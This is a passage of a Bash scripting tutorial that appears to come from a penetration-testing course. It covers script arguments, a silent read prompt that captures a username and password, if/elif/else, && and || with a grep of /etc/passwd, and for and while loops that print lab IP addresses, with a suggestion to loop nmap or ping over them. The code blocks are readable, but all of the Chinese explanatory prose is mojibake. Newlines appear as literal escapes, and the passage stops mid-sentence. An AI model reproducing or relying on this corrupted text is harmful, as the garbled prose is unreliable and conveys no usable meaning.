æ‰“å°é¢å¤–çš„è°ƒè¯•è¾“å‡ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ›´å®¹æ˜“åœ°çœ‹åˆ°è¢«æ‰§è¡Œçš„å‘½ä»¤å’Œå®ƒä»¬çš„ç»“æœã€‚å½“æˆ‘ä»¬æŸ¥çœ‹è¿™ä¸ªè¾“å‡ºæ—¶ï¼Œæ³¨æ„åˆ°å‰é¢æœ‰ä¸€ä¸ª â€œ+â€ å·çš„å‘½ä»¤æ˜¯åœ¨å½“å‰ shell ä¸­æ‰§è¡Œçš„ï¼Œå‰é¢æœ‰ä¸¤ä¸ª â€œ++â€ å·çš„å‘½ä»¤æ˜¯åœ¨å­ shell ä¸­æ‰§è¡Œçš„ã€‚\n\nè¿™è®©æˆ‘ä»¬æ¸…æ¥šåœ°çœ‹åˆ°ï¼Œvar1 å’Œ var2 çš„ç¬¬äºŒæ¬¡å£°æ˜å‘ç”Ÿåœ¨å­ shell ä¸­ï¼Œå¹¶æ²¡æœ‰åƒæœ€åˆçš„å£°æ˜é‚£æ ·æ”¹å˜å½“å‰ shell ä¸­çš„å€¼ã€‚\n\n### å‚æ•°\n\nå¹¶éæ‰€æœ‰çš„ Bash è„šæœ¬éƒ½éœ€è¦å‚æ•°ã€‚ç„¶è€Œï¼Œäº†è§£ Bash å¦‚ä½•è§£é‡Šå‚æ•°ä»¥åŠå¦‚ä½•ä½¿ç”¨å‚æ•°æ˜¯éå¸¸é‡è¦çš„ã€‚æˆ‘ä»¬å·²ç»æ‰§è¡Œäº†å¸¦æœ‰å‚æ•°çš„ Linux å‘½ä»¤ã€‚ä¾‹å¦‚ï¼Œå½“æˆ‘ä»¬è¿è¡Œ ls -l /var/log å‘½ä»¤æ—¶ï¼Œ-l å’Œ /var/log éƒ½æ˜¯ ls å‘½ä»¤çš„å‚æ•°ã€‚\n\nBash è„šæœ¬ä¹Ÿä¸ä¾‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥æä¾›å‘½ä»¤è¡Œå‚æ•°å¹¶åœ¨æˆ‘ä»¬çš„è„šæœ¬ä¸­ä½¿ç”¨å®ƒä»¬ã€‚\n\n```bash\nkali@kali:~$ cat ./arg.sh\n#!/bin/bash\n\necho \"The first two arguments are $1 and $2\"\n\nkali@kali:~$ chmod +x ./arg.sh\n\nkali@kali:~$ ./arg.sh hello there\nThe first two arguments are hello and there\n```\n\næˆ‘ä»¬åˆ›å»ºäº†ä¸€ä¸ªç®€å•çš„ Bash è„šæœ¬ï¼Œç»™å®ƒè®¾ç½®äº†å¯æ‰§è¡Œæƒé™ï¼Œç„¶åå¸¦ç€ä¸¤ä¸ªå‚æ•°è¿è¡Œå®ƒã€‚$1 å’Œ $2 çš„å˜é‡ä»£è¡¨ä¼ é€’ç»™è„šæœ¬çš„ç¬¬ä¸€ä¸ªå’Œç¬¬äºŒä¸ªå‚æ•°ã€‚è®©æˆ‘ä»¬æ¥æ¢è®¨ä¸€äº›ç‰¹æ®Šçš„ Bash å˜é‡ã€‚\n\nåœ¨è°ƒè¯•è„šæœ¬æ—¶ï¼Œè¿™äº›ç‰¹æ®Šçš„å˜é‡ä¸­çš„ä¸€äº›å¯èƒ½éå¸¸æœ‰ç”¨ã€‚ä¾‹å¦‚ï¼Œæˆ‘ä»¬ä¹Ÿè®¸å¯ä»¥è·å¾—ä¸€ä¸ªå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ï¼Œä»¥ç¡®å®šå®ƒæ˜¯å¦è¢«æˆåŠŸæ‰§è¡Œã€‚\n\n### è¯»å–ç”¨æˆ·è¾“å‡º\n\nå‘½ä»¤è¡Œå‚æ•°æ˜¯ç”¨æˆ·è¾“å…¥çš„ä¸€ç§å½¢å¼ï¼Œä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥ç”¨ read å‘½ä»¤åœ¨è„šæœ¬è¿è¡Œæ—¶æ•è·äº¤äº’å¼ç”¨æˆ·è¾“å…¥ã€‚åœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ read æ¥æ•è·ç”¨æˆ·è¾“å…¥ï¼Œå¹¶å°†å…¶åˆ†é…ç»™ä¸€ä¸ªå˜é‡ã€‚\n\n```bash\nkali@kali:~$ cat ./input.sh\n#!/bin/bash\n\necho \"Hello there, would you like to learn how to hack: Y/N?\"\n\nread answer\n\necho \"Your answer was $answer\"\n\nkali@kali:~$ chmod +x ./input.sh\n\nkali@kali:~$ ./input.sh\nHello there, would you like to learn how to hack: Y/N?\nY\nYour answer was Y\n```\n\næˆ‘ä»¬å¯ä»¥é€šè¿‡å„ç§å‘½ä»¤è¡Œé€‰é¡¹æ¥æ”¹å˜ read å‘½ä»¤çš„è¡Œä¸ºï¼Œä¸¤ä¸ªæœ€å¸¸ç”¨çš„é€‰é¡¹åŒ…æ‹¬ `-p` å’Œ `-s` ï¼Œå‰è€…å…è®¸æˆ‘ä»¬æŒ‡å®šä¸€ä¸ªæç¤ºï¼Œåè€…ä½¿ç”¨æˆ·çš„è¾“å…¥ä¿æŒæ²‰é»˜ã€‚åè€…æ˜¯æ•è·ç”¨æˆ·å‡­è¯çš„ç†æƒ³é€‰æ‹©ã€‚\n\n```bash\nkali@kali:~$ cat ./input2.sh\n#!/bin/bash\n# Prompt the user for credentials\n\nread -p 'Username: ' username\nread -sp 'Password: ' password\n\necho \"Thanks, your creds are as follows: \" $username \" and \" $password\n\nkali@kali:~$ chmod +x ./input2.sh\n\nkali@kali:~$ ./input2.sh\nUsername: kali\nPassword:\nThanks, your creds are as follows: kali and nothing2see!\n```\n\n## ifï¼ŒElseï¼ŒElif è¯­å¥\n\næ¡ä»¶æ€§è¯­å¥å…è®¸æˆ‘ä»¬æä¾›ä¸åŒçš„æ¡ä»¶æ‰§è¡Œä¸åŒçš„æ“ä½œã€‚æœ€å¸¸è§çš„æ¡ä»¶æ€§ Bash è¯­å¥å·²ç»åŒ…æ‹¬ ifã€else å’Œ elifã€‚\n\nif è¯­å¥ç›¸å¯¹ç®€å• `-it` æ£€æŸ¥ä¸€ä¸ªæ¡ä»¶æ˜¯å¦ä¸ºçœŸ `-but` éœ€è¦ä¸€ä¸ªéå¸¸ç‰¹å®šçš„è¯­æ³•ã€‚è¯·ä»”ç»†æ³¨æ„è¿™ä¸ªè¯­æ³•ï¼Œç‰¹åˆ«æ˜¯å¿…è¦çš„ç©ºæ ¼çš„ä½¿ç”¨ï¼š\n\n```bash\nif [ <some test> ]\nthen\n\t<perform an action>\nfi\n```\n\nåœ¨è¿™ä¸ªåˆ—è¡¨ä¸­ï¼Œå¦‚æœâ€œä¸€äº›æµ‹è¯•â€è¯„ä¼°ä¸ºçœŸï¼Œè„šæœ¬å°†â€œæ‰§è¡Œä¸€ä¸ªåŠ¨ä½œâ€ï¼Œæˆ–è€…åœ¨ then å’Œ fi ä¹‹é—´çš„ä»»ä½•å‘½ä»¤ã€‚æˆ‘ä»¬æ¥çœ‹çœ‹ä¸€ä¸ªå®é™…çš„ä¾‹å­ã€‚\n\n```bash\nkali@kali:~$ cat ./if.sh\n#!/bin/bash\n# if statement example\n\nread -p \"What is your age: \" age\n\nif [ $age -lt 16 ]\nthen\n echo \"You might need parental permission to take this course!\"\nfi\n\nkali@kali:~$ chmod +x ./if.sh\n\nkali@kali:~$ ./if.sh\nWhat is your age: 15\nYou might need parental permission to take this course!\n```\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç”¨ä¸€ä¸ª if è¯­å¥æ¥æ£€æŸ¥ç”¨æˆ·è¾“å…¥çš„å¹´é¾„ã€‚å¦‚æœè¾“å…¥çš„å¹´é¾„å°äºï¼ˆ-ltï¼‰16 å²ï¼Œè„šæœ¬å°†è¾“å‡ºä¸€æ¡è­¦å‘Šä¿¡æ¯ã€‚\n\nä¸Šé¢ if è¯­å¥ä¸­çš„æ–¹æ‹¬å·ï¼ˆâ€[â€ å’Œ â€œ]â€ï¼‰å®é™…ä¸Šæ˜¯å¯¹ test å‘½ä»¤çš„å¼•ç”¨ã€‚è¿™åªæ˜¯æ„å‘³ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æµ‹è¯•å‘½ä»¤æ‰€å…è®¸çš„æ‰€æœ‰è¿ç®—ç¬¦ã€‚ä¸€äº›æœ€å¸¸è§çš„è¿ç®—ç¬¦åŒ…æ‹¬ï¼š\n\nè€ƒè™‘åˆ°ä¸Šè¿°æƒ…å†µï¼Œæˆ‘ä»¬ä¹‹å‰ä½¿ç”¨ if çš„ä¾‹å­å¯ä»¥ä¸åŠ æ–¹æ‹¬å·æ”¹å†™å¦‚ä¸‹ï¼š\n\n```bash\nkali@kali:~$ cat ./if2.sh\n#!/bin/bash\n# if statement example 2\n\nread -p \"What is your age: \" age\n\nif test $age -lt 16\nthen\n echo \"You might need parental permission to take this course!\"\nfi\n\nkali@kali:~$ chmod +x ./if2.sh\n\nkali@kali:~$ ./if2.sh\nWhat is your age: 15\nYou might need parental permission to take this course!\n```\n\nå°½ç®¡è¿™ä¸ªä¾‹å­ä¸ä½¿ç”¨æ–¹æ‹¬å·çš„ä¾‹å­åœ¨åŠŸèƒ½ä¸Šæ˜¯ç­‰åŒçš„ï¼Œä½†ä½¿ç”¨æ–¹æ‹¬å·ä½¿ä»£ç ç¨ç¨å®¹æ˜“é˜…è¯»ã€‚\n\næˆ‘ä»¬è¿˜æ¶æ„åœ¨è¯­å¥ä¸ºçœŸæ—¶æ‰§è¡ŒæŸä¸€ç»„åŠ¨ä½œï¼Œåœ¨è¯­å¥ä¸ºå‡æ—¶æ‰§è¡Œå¦ä¸€ç»„åŠ¨ä½œã€‚è¦åšåˆ°è¿™ä¸€ç‚¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ else è¯­å¥ï¼Œå®ƒçš„è¯­æ³•å¦‚ä¸‹ï¼š\n\n```bash\nif [ <some test> ]\nthen\n\t<perform action>\nelse\n\t<perform another action>\nfi\n```\n\nè®©æˆ‘ä»¬æ‰©å±•æˆ‘ä»¬ä¹‹å‰çš„â€œå¹´é¾„â€ä¾‹å­ï¼ŒåŒ…æ‹¬ else è¯­å¥ã€‚\n\n```bash\nkali@kali:~$ cat ./else.sh\n#!/bin/bash\n# else statement example\n\nread -p \"What is your age: \" age\n\nif [ $age -lt 16 ]\nthen\n\techo \"You might need parental permission to take this course!\"\nelse\n\techo \"Welcome to the course!\"\nfi\n\nkali@kali:~$ chmod +x ./else.sh\n\nkali@kali:~$ ./else.sh\nWhat is your age: 21\nWelcome to the course!\n```\n\nè¯·æ³¨æ„ï¼Œå½“è¾“å…¥çš„å¹´é¾„å¤§äºï¼ˆæˆ–æ›´ç¡®åˆ‡åœ°è¯´æ˜¯â€œä¸å°äºâ€ï¼‰16 å²æ—¶ï¼Œæ‰§è¡Œ else è¯­å¥ã€‚\n\nif å’Œ else è¯­å¥åªå…è®¸ä¸¤ä¸ªä»£ç æ‰§è¡Œåˆ†æ”¯ã€‚æˆ‘ä»¬å¯ä»¥ç”¨ elif è¯­å¥å¢åŠ é¢å¤–çš„åˆ†æ”¯ï¼Œelif è¯­å¥ä½¿ç”¨ä»¥ä¸‹æ¨¡å¼ï¼š\n\n```bash\nif [ <some test> ]\nthen\n\t<perform action>\nelif [ <some test> ]\nthen\n\t<perform different action>\nelse\n\t<perform yet another different action>\nfi\n```\n\nè®©æˆ‘ä»¬å†æ¬¡æ‰©å±•æˆ‘ä»¬çš„â€œå¹´é¾„â€ä¾‹å­ï¼ŒåŒ…æ‹¬ elif è¯­å¥ï¼š\n\n```bash\nkali@kali:~$ cat ./elif.sh\n#!/bin/bash\n# elif example\n\nread -p \"What is your age: \" age\nif [ $age -lt 16 ]\nthen\n\techo \"You might need parental permission to take this course!\"\nelif [ $age -gt 60 ]\nthen\n\techo \"Hats off to you, respect!\"\nelse\n\techo \"Welcome to the course!\"\nfi\n\nkali@kali:~$ chmod +x ./elif.sh\n\nkali@kali:~$ ./elif.sh\nWhat is your age: 65\nHats off to you, respect!\n```\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œä»£ç çš„æ‰§è¡Œæµç¨‹ç¨å¾®å¤æ‚ä¸€äº›ã€‚æŒ‰ç…§æ“ä½œé¡ºåºï¼Œå¦‚æœè¾“å…¥çš„å¹´é¾„å°äº 16 å²ï¼Œåˆ™æ‰§è¡Œ then åˆ†æ”¯ï¼›å¦‚æœå¹´é¾„å¤§äº 60 å²ï¼Œåˆ™è¿›å…¥ elif åˆ†æ”¯ï¼ˆå¹¶æ˜¾ç¤º â€œHats off.â€ï¼‰ï¼›else åˆ†æ”¯åªåœ¨å¹´é¾„å¤§äº 16 å² ä½†å°äº60å²æ—¶æ‰§è¡Œã€‚\n\n## å¸ƒå°”é€»è¾‘æ“ä½œ\n\nå¸ƒå°”é€»è¾‘è¿ç®—ç¬¦ï¼Œå¦‚ ANDï¼ˆ&&ï¼‰å’Œ ORï¼ˆ||ï¼‰ï¼Œæœ‰ç‚¹ç¥ç§˜ï¼Œå› ä¸º Bash ä»¥å„ç§æ–¹å¼ä½¿ç”¨å®ƒä»¬ã€‚\n\nä¸€ä¸ªå¸¸è§çš„ç”¨æ³•æ˜¯åœ¨å‘½ä»¤åˆ—è¡¨ä¸­ï¼Œè¿™æ˜¯å‘½ä»¤é“¾ï¼Œå…¶æµç¨‹ç”±è¿ç®—ç¬¦æ§åˆ¶ã€‚â€œ|â€ï¼ˆç®¡é“ç¬¦ï¼‰ç¬¦å·æ˜¯å‘½ä»¤åˆ—è¡¨ä¸­å¸¸ç”¨çš„è¿ç®—ç¬¦ï¼Œå®ƒå°†ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä¼ é€’ç»™å¦ä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ã€‚åŒæ ·ï¼Œå¸ƒå°”é€»è¾‘è¿ç®—ç¬¦æ ¹æ®å‰ä¸€ä¸ªå‘½ä»¤æ˜¯å¦æˆåŠŸï¼ˆæˆ–è¿”å› True æˆ– 0ï¼‰æˆ–å¤±è´¥ï¼ˆè¿”å› Flase æˆ–é 0ï¼‰æ¥æ‰§è¡Œå‘½ä»¤ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹çœ‹ ANDï¼ˆ&&ï¼‰å¸ƒå°”è¿ç®—ç¬¦ï¼Œå®ƒåªåœ¨å‰ä¸€ä¸ªå‘½ä»¤æˆåŠŸï¼ˆæˆ–è¿”å› True æˆ– 0ï¼‰çš„æƒ…å†µä¸‹æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ user2=kali\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\"\nkali:x:1000:1000:,,,:/home/kali:/bin/bash\nkali found!\n\nkali@kali:~$ user2=bob\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\"\n```\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬é¦–å…ˆå°†æˆ‘ä»¬è¦æœç´¢çš„ç”¨æˆ·ååˆ†é…ç»™ user2 å˜é‡ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä½¿ç”¨ grep å‘½ä»¤æ£€æŸ¥æŸä¸ªç”¨æˆ·æ˜¯å¦åœ¨ /etc/passwd æ–‡ä»¶ä¸­åˆ—å‡ºï¼Œå¦‚æœæ˜¯ï¼Œgrep è¿”å› Trueï¼Œecho å‘½ä»¤è¢«æ‰§è¡Œã€‚ç„¶è€Œï¼Œå½“æˆ‘ä»¬è¯•å›¾æœç´¢ä¸€ä¸ªæˆ‘ä»¬çŸ¥é“ä¸å­˜åœ¨ /etc/passwd æ–‡ä»¶ä¸­çš„ç”¨æˆ·æ—¶ï¼Œæˆ‘ä»¬çš„ echo å‘½ä»¤æ²¡æœ‰è¢«æ‰§è¡Œã€‚\n\næŒ¡åœ¨å‘½ä»¤åˆ—è¡¨ä¸­ä½¿ç”¨æ—¶ï¼ŒORï¼ˆ||ï¼‰è¿ç®—ç¬¦ä¸ ANDï¼ˆ&&ï¼‰ç›¸åï¼›å®ƒåªåœ¨å‰ä¸€ä¸ªå‘½ä»¤å¤±è´¥ï¼ˆè¿”å› False æˆ– é 0ï¼‰æ—¶æ‰§è¡Œä¸‹ä¸€ä¸ªå‘½ä»¤ã€‚\n\n```bash\nkali@kali:~$ echo $user2\nbob\n\nkali@kali:~$ grep $user2 /etc/passwd && echo \"$user2 found!\" || echo \"$user2 not found!\"\nbob not found!\n```\n\nåœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æŠŠå‰é¢çš„å‘½ä»¤æ›´è¿›ä¸€æ­¥ï¼Œå¢åŠ äº† ORï¼ˆ||ï¼‰è¿ç®—ç¬¦ï¼Œåé¢æ˜¯ç¬¬äºŒæ¡ echo å‘½ä»¤ã€‚ç°åœ¨ï¼Œå½“ grep æ²¡æœ‰æ‰¾åˆ°åŒ¹é…çš„è¡Œå¹¶è¿”å› False æ—¶ï¼Œå°±ä¼šæ‰§è¡Œ ORï¼ˆ||ï¼‰æ“ä½œç¬¦åçš„ç¬¬äºŒä¸ª echo å‘½ä»¤ã€‚\n\nè¿™äº›è¿ç®—ç¬¦ä¹Ÿå¯ä»¥åœ¨æµ‹è¯•ä¸­ç”¨æ¥æ¯”è¾ƒå˜é‡æˆ–å…¶ä»–æµ‹è¯•çš„ç»“æœã€‚å½“è¿™æ ·ä½¿ç”¨æ—¶ï¼ŒANDï¼ˆ&&ï¼‰ç»“åˆäº†ä¸¤ä¸ªç®€å•çš„æ¡ä»¶ï¼Œå¦‚æœå®ƒä»¬éƒ½æ˜¯çœŸï¼Œç»“åˆçš„ç»“æœå°±æ˜¯æˆåŠŸï¼ˆæˆ– True æˆ– 0ï¼‰ã€‚\n\næƒ³ä¸€ä¸‹è¿™ä¸ªä¾‹å­ï¼š\n\n```bash\nkali@kali:~$ cat ./and.sh\n#/bin/bash\n# and example\n\nif [ $USER == 'kali' ] && [ $HOSTNAME == 'kali' ]\nthen\n\techo \"Multiple statements are true!\"\nelse\n\techo \"Not much to see here...\"\nfi\n\nkali@kali:~$ chmod +x ./and.sh\n\nkali@kali:~$ ./and.sh\nMultiple statements are true!\n\nkali@kali:~$ echo $USER && echo $HOSTNAME\nkali\nkali\n```\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç”¨ ANDï¼ˆ&&ï¼‰æ¥æµ‹è¯•å¤šä¸ªæ¡ä»¶ï¼Œç”±äºä¸¤ä¸ªå˜é‡çš„æ¯”è¾ƒéƒ½æ˜¯çœŸçš„ï¼Œæ•´ä¸ª if è¡Œéƒ½æˆåŠŸäº†ï¼Œæ‰€ä»¥ then åˆ†æ”¯æ‰§è¡Œã€‚\n\nå½“åœ¨æµ‹è¯•ä¸­ä½¿ç”¨æ—¶ï¼ŒOR (||) å¸ƒå°”è¿ç®—ç¬¦è¢«ç”¨æ¥æµ‹è¯•ä¸€ä¸ªæˆ–å¤šä¸ªæ¡ä»¶ï¼Œä½†åªæœ‰å…¶ä¸­ä¸€ä¸ªæ¡ä»¶ä¸ºçœŸæ‰èƒ½ç®—ä½œæˆåŠŸã€‚\n\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸ªä¾‹å­ï¼š\n\n```bash\nkali@kali:~$ cat ./or.sh\n#!/bin/bash\n# or example\n\nif [ $USER == 'kali' ] || [ $HOSTNAME == 'pwn' ]\nthen\n\techo \"One condition is true, this line is printed\"\nelse\n\techo \"You are out of luck!\"\nfi\n\nkali@kali:~$ chmod +x ./or.sh\n\nkali@kali:~$ ./or.sh\nOne condition is true, this line is printed\n\nkali@kali:~$ echo $USER && echo $HOSTNAME\nkali\nkali\n```\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç”¨ ORï¼ˆ||ï¼‰æ¥æµ‹è¯•å¤šä¸ªæ¡ä»¶ï¼Œç”±äºå…¶ä¸­ä¸€ä¸ªå˜é‡çš„æ¯”è¾ƒä¸ºçœŸï¼Œæ•´ä¸ª if è¡ŒæˆåŠŸäº†ï¼Œæ‰€ä»¥ then åˆ†æ”¯æ‰§è¡Œã€‚\n\n## å¾ªç¯\n\nåœ¨è®¡ç®—æœºç¼–ç¨‹ä¸­ï¼Œå¾ªç¯å¸®åŠ©æˆ‘ä»¬å¤„ç†é‡å¤æ€§çš„ä»»åŠ¡ï¼Œæˆ‘ä»¬éœ€è¦è¿è¡Œè¿™äº›ä»»åŠ¡ç›´åˆ°æ»¡è¶³æŸä¸ªæ ‡å‡†ã€‚å¾ªç¯å¯¹äºæ¸—é€æµ‹è¯•äººå‘˜æ¥è¯´ç‰¹åˆ«æœ‰ç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬å»ºè®®å¯†åˆ‡å…³æ³¨è¿™ä¸€éƒ¨åˆ†ã€‚\n\nåœ¨ Bash ä¸­ï¼Œä¸¤ä¸ªæœ€ä¸»è¦çš„å¾ªç¯å‘½ä»¤æ˜¯ for å’Œ whileï¼Œæˆ‘ä»¬å°†çœ‹åˆ°è¿™ä¸¤ä¸ªå‘½ä»¤ã€‚\n\n### For å¾ªç¯\n\nFor å¾ªç¯æ˜¯éå¸¸å®ç”¨çš„ï¼Œåœ¨ Bash å•è¡Œç¨‹åºä¸­æ•ˆæœéå¸¸å¥½ã€‚åœ¨è¿™ç§ç±»å‹çš„å¾ªç¯æ˜¯ç”¨æ¥å¯¹ä¸€ä¸ªåˆ—è¡¨ä¸­çš„æ¯ä¸ªé¡¹ç›®æ‰§è¡Œä¸€ç»„æŒ‡å®šçš„å‘½ä»¤ã€‚è®©æˆ‘ä»¬ç®€å•åœ°çœ‹ä¸€ä¸‹å®ƒçš„ä¸€èˆ¬è¯­æ³•ï¼š\n\n```bash\nfor var-name in <list>\ndo\n <action to perform>\ndone\n```\n\nè¿™ä¸ª for å¾ªç¯å°†å–èµ°åˆ—è¡¨ä¸­çš„æ¯ä¸€ä¸ªé¡¹ç›®ï¼ˆæŒ‰é¡ºåºï¼‰ï¼Œå°†è¯¥é¡¹ç›®ä½œä¸ºå˜é‡ var-name çš„å€¼ï¼Œåœ¨ do å’Œ done ä¹‹é—´æ‰§è¡Œç»™å®šçš„åŠ¨ä½œï¼Œç„¶åå›åˆ°é¡¶éƒ¨ï¼ŒæŠ“å–åˆ—è¡¨ä¸­çš„ä¸‹ä¸€ä¸ªé¡¹ç›®ï¼Œé‡å¤è¿™äº›æ­¥éª¤ï¼Œç›´åˆ°åˆ—è¡¨ç”¨å®Œã€‚\n\nè®©æˆ‘ä»¬çœ‹çœ‹ä¸€ä¸ªæ›´å®ç”¨çš„ä¾‹å­ï¼Œå®ƒå°†å¿«é€Ÿæ‰“å° 10.11.1.0/24 å­ç½‘ä¸­çš„å‰ 10 ä¸ª IP åœ°å€ï¼š\n\n```bash\nkali@kali:~$ for ip in $(seq 1 10); do echo 10.11.1.$ip; done\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\nåœ¨è¿™ä¸ª Bash å•è¡Œç¨‹åºä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ seq å‘½ä»¤æ¥æ‰“å°ä¸€ä¸ªæ•°å­—åºåˆ—ï¼Œåœ¨è¿™é‡Œæ˜¯ 1 åˆ° 10 çš„æ•°å­—ã€‚æ¯ä¸ªæ•°å­—éƒ½è¢«åˆ†é…ç»™ ip å˜é‡ï¼Œç„¶åæ¯ä¸ª IP åœ°å€éƒ½è¢«æ˜¾ç¤ºåœ¨å±å¹•ä¸Šï¼Œfor å¾ªç¯è¿è¡Œå¤šæ¬¡ï¼Œåœ¨ç³»åˆ—çš„æœ€åé€€å‡ºã€‚\n\nå¦ä¸€ç§é‡å†™å‰é¢ for å¾ªç¯çš„æ–¹æ³•æ¶‰åŠåˆ°ä½¿ç”¨èŒƒå›´çš„æ‹¬å·æ‰©å±•ã€‚ä½¿ç”¨èŒƒå›´çš„æ‹¬å·æ‰©å±•å†™å‡ºäº†èŒƒå›´çš„ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªå€¼ï¼Œå¯ä»¥æ˜¯ä¸€ä¸ªæ•°å­—æˆ–å­—ç¬¦çš„åºåˆ—ã€‚è¿™å°±æ˜¯æ‰€è°“çš„â€œåºåˆ—è¡¨è¾¾å¼â€ã€‚\n\n```bash\nkali@kali:~$ for i in {1..10}; do echo 10.11.1.$i;done\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\nè¿™ç§ç±»å‹çš„å¾ªç¯æœ‰å¾ˆå¤§çš„æ½œåŠ›ã€‚åœ¨å±å¹•ä¸Šæ˜¾ç¤º IP åœ°å€å¯èƒ½çœ‹èµ·æ¥ä¸æ˜¯å¾ˆæœ‰ç”¨ï¼Œä½†æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŒæ ·çš„å¾ªç¯ï¼Œä½¿ç”¨ nmap è¿è¡Œç«¯å£æ‰«æã€‚æˆ‘ä»¬è¿˜å¯ä»¥å°è¯•ä½¿ç”¨ ping å‘½ä»¤ï¼Œçœ‹çœ‹æ˜¯å¦æœ‰ä»»ä½• IP åœ°å€å¯¹ ICMP å›æ³¢è¯·æ±‚åšå‡ºå“åº”ç­‰ç­‰ã€‚\n\n### While å¾ªç¯\n\nWhile å¾ªç¯ä¹Ÿç›¸å½“å¸¸è§ï¼Œåœ¨è¡¨è¾¾å¼ä¸ºçœŸæ—¶æ‰§è¡Œä»£ç ã€‚While å¾ªç¯æœ‰ä¸€ä¸ªç®€å•çš„æ ¼å¼ï¼Œå’Œ if ä¸€æ ·ï¼Œä½¿ç”¨æ–¹æ‹¬å·ï¼ˆ[]ï¼‰æ¥æµ‹è¯•ã€‚\n\n```bash\nwhile [ <some test> ]\ndo\n <perform an action>\ndone\n```\n\nè®©æˆ‘ä»¬ç”¨ä¸€ä¸ª while å¾ªç¯æ¥é‡æ–°åˆ›å»ºå‰é¢çš„ä¾‹å­ã€‚\n\n```bash\nkali@kali:~$ cat ./while.sh\n#!/bin/bash\n# while loop example\n\ncounter=1\n\nwhile [ $counter -lt 10 ]\ndo\n echo \"10.11.1.$counter\"\n ((counter++))\ndone\n\nkali@kali:~$ chmod +x ./while.sh\n\nkali@kali:~$ ./while.sh\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n```\n\nè¿™ä¸æ˜¯æˆ‘ä»¬é¢„æœŸçš„è¾“å‡ºã€‚è¿™æ˜¯ä¸€ä¸ªå¸¸è§çš„é”™è¯¯ï¼Œå«åšâ€œåä¸€â€é”™è¯¯ã€‚åœ¨ä¸Šé¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨äº† `-lt` ï¼ˆå°‘äºï¼‰ï¼Œè€Œä¸æ˜¯ `-le` ï¼ˆå°‘äºæˆ–ç­‰äºï¼‰ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„è®¡æ•°å™¨åªåˆ°äº† 9ï¼Œè€Œä¸æ˜¯åŸæ¥çš„ 10ã€‚\n\n((counter++)) è¡Œä½¿ç”¨åŒæ‹¬å· (()) ç»“æ„ï¼ŒåŒæ—¶è¿›è¡Œç®—æ•°æ‰©å±•å’Œè¯„ä¼°ã€‚åœ¨è¿™ä¸ªç‰¹æ®Šçš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç”¨å®ƒæ¥å¢åŠ æˆ‘ä»¬çš„è®¡æ•°å™¨å˜é‡ 1ã€‚è®©æˆ‘ä»¬é‡æ–°å†™ä¸€ä¸‹ while å¾ªç¯ï¼Œå†è¯•ä¸€ä¸‹è¿™ä¸ªä¾‹å­ã€‚\n\n```bash\nkali@kali:~$ cat ./while2.sh\n#!/bin/bash\n# while loop example 2\n\ncounter=1\n\nwhile [ $counter -le 10 ]\ndo\n echo \"10.11.1.$counter\"\n ((counter++))\ndone\n\nkali@kali:~$ chmod +x ./while2.sh\n\nkali@kali:~$ ./while2.sh\n10.11.1.1\n10.11.1.2\n10.11.1.3\n10.11.1.4\n10.11.1.5\n10.11.1.6\n10.11.1.7\n10.11.1.8\n10.11.1.9\n10.11.1.10\n```\n\nå¾ˆå¥½ï¼Œæˆ‘ä»¬çš„ while å¾ªç¯ç°åœ¨çœ‹èµ·æ¥å¥½å¤šäº†ã€‚\n\n## å‡½æ•°\n\nåœ¨ Bash è„šæœ¬æ–¹é¢ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå‡½æ•°çœ‹ä½œæ˜¯è„šæœ¬ä¸­çš„è„šæœ¬ï¼Œå½“æˆ‘ä»¬éœ€è¦åœ¨ä¸€ä¸ªè„šæœ¬ä¸­å¤šæ¬¡æ‰§è¡Œç›¸åŒçš„ä»£ç æ—¶ï¼Œè¿™æ˜¯å¾ˆæœ‰ç”¨çš„ã€‚ä¸å…¶ä¸€æ¬¡åˆä¸€æ¬¡åœ°é‡å†™åŒä¸€å—ä»£ç ï¼Œæˆ‘ä»¬ä¸å¦‚æŠŠå®ƒå†™æˆä¸€ä¸ªå‡½æ•°ï¼Œç„¶åæ 